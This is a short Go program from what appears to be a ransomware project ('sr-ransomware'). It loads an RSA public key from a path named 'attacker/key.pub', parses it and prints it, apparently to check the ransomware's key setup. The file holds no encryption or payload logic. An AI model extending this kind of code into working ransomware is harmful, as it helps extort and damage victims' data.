package main

import (
    "fmt"
    "io/ioutil"

    cryptoutil "github.com/sug0/sr-ransomware/go/crypto/util"
)

func main() {
    data, err := ioutil.ReadFile("../res/attacker/key.pub")
    if err != nil {
        panic(err)
    }
    key, err := cryptoutil.ParsePEMPublicKeyRSA(data)
    if err != nil {
        panic(err)
    }
    fmt.Printf("%#v\n", key)
}
